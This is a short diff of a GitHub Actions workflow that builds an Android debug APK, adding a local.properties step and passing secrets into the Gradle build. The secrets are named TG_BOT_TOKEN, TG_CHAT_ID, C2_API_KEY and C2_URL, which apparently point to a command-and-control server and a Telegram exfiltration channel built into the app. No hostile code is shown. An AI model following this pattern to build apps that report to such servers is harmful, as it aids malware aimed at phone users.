@@ -36,6 +36,9 @@ jobs:
           yes | "$ANDROID_SDK_ROOT/cmdline-tools/latest/bin/sdkmanager" --licenses > /dev/null 2>&1 || true
           "$ANDROID_SDK_ROOT/cmdline-tools/latest/bin/sdkmanager" --install "platforms;android-34" "build-tools;34.0.0" > /dev/null
 
+      - name: Write local.properties
+        run: echo "sdk.dir=$ANDROID_SDK_ROOT" > local.properties
+
       - name: Cache Gradle
         uses: actions/cache@v4
         with:
@@ -52,10 +55,15 @@ jobs:
             gradle wrapper --gradle-version 8.4
           fi
 
-      - name: Grant execute permission for gradlew
+      - name: Grant execute permission
         run: chmod +x gradlew
 
       - name: Build debug APK
+        env:
+          TG_BOT_TOKEN: ${{ secrets.TG_BOT_TOKEN }}
+          TG_CHAT_ID:   ${{ secrets.TG_CHAT_ID }}
+          C2_API_KEY:   ${{ secrets.C2_API_KEY }}
+          C2_URL:       ${{ secrets.C2_URL }}
         run: ./gradlew assembleDebug --no-daemon --stacktrace
 
       - name: Upload debug APK
